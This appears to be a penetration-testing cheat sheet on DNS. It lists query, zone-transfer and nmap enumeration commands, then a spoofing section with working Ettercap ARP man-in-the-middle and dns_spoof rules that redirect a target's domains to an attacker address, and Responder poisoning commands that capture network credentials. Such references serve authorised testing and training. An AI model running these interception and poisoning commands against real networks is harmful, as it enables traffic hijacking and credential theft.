# DNS Enumeration and Exploitation Technique

---

## Reconaissance
```powershell
// Basic DNS Queries
nslookup example.com
nslookup -type=ANY example.com

host -l example.com ns1.example.com | grep -E "A|MX|CNAME|TXT"

// Retrieves all available DNS records (A, MX, NS, TXT, etc.) for a domain.
dig example.com ANY +short
dig @8.8.8.8 example.com

dig example.com NS
dig example.com SOA
dig example.com MX
dig example.com TXT
dig example.com CNAME
dig example.com AAAA
dig example.com A
dig example.com SRV
dig example.com DNSKEY
dig example.com DS
dig example.com NSEC

// PTR Record
dig @10.10.10.10 -x example.com
```

---

## Enumeration
```powershell
// Zone Transfer
dig @ns1.example.com example.com AXFR
host -l example.com ns1.example.com
nslookup -type=AXFR example.com ns1.example.com
fierce --domain example.com

// DNS Zone Transfer Exploitation
dig @ns1.example.com example.com AXFR | tee zone_dump.txt

nmap -sU -p 53 --script dns-brute example.com
nmap -sU -p 53 --script dns-zone-transfer --script-args dns-zone-transfer.domain=example.com <ns_ip>
nmap -sU -p 53 --script dns-srv-enum --script-args dns-srv-enum.domain=example.com <target>
nmap -p 53 --script dns-recursion <target>
```

---

# DNS Spoofing

```bash
# Terminal 1: Start Ettercap
ettercap -T -q -i eth0 -M arp:remote /TARGET_IP/ /GATEWAY_IP/

# Terminal 2: DNS Spoof rules (/etc/ettercap/etter.dns)
evil.com A 192.168.1.100
*.target.com A 192.168.1.100

# Load DNS spoof plugin
ettercap -T -q -i eth0 -M arp:remote /TARGET_IP/ /GATEWAY_IP/ -P dns_spoof


# Full poisoning
responder -I eth0 -wrdvPfu

# Targeted DNS only
responder -I eth0 -rD
```
